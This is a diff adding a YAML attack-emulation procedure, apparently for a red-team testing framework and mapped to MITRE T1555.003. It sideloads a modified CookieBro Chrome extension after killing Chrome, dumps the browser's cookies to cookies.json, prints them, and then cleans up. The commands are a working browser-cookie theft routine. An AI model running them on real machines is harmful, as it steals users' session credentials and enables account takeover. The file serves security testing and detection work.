@@ -1,0 +1,44 @@
+---
+api_version: 2.0
+uuid: 14fbe408-296c-4e33-9908-19711082efe7
+name: sideload_malicious_extension
+authors:
+  - cedowens
+description: |
+  This TTP drops a modified version of CookieBro, kills current Chrome windows and opens a new window using the load extension flag to temporarily load the modified CookieBro extension, and browses to the cookie editor which will force download the Browser cookies.
+requirements:
+ platforms:
+   - os: windows
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1555 Credentials from Password Stores
+  subtechniques:
+    - T1555.003 Credentials from Web Browsers
+steps:
+  - name: export_cookies
+    executor: cmd.exe
+    inline: |
+        echo "First copying the modified CookieBro extension to the current user's Downloads directory..."
+        xcopy "com.google.chrome-init" "C:\Users\%USERNAME%\Downloads\com.google.chrome-init" /E /I /Y
+        echo "Next, executing a batch script which closes Chrome windows, temporarily loads the modified extension to dump cookies, and then closes Chrome..."
+        cmd.exe /C start .\DCC.bat
+        if exist "C:\Users\%USERNAME%\Downloads\cookies.json" (
+            echo "cookies.json successfully exported. Cookies dumped: "
+            type C:\Users\%USERNAME%\Downloads\cookies.json
+        ) else (
+            echo "cookies.json was NOT dumped. TTP was NOT successful."
+        )
+    cleanup:
+      executor: cmd.exe
+      inline: |
+          if exist "C:\Users\%USERNAME%\Downloads\cookies.json" (
+              echo "Copying the cookies.json file, viewing it, and then deleting the cookies.json file"
+              copy C:\Users\%USERNAME%\Downloads\cookies.json .
+              type cookies.json
+              del C:\Users\%USERNAME%\Downloads\cookies.json
+              del cookies.json
+          )
+          rd /s /q "C:\Users\%USERNAME%\Downloads\com.google.chrome-init"
+          echo "Cleanup Done!"
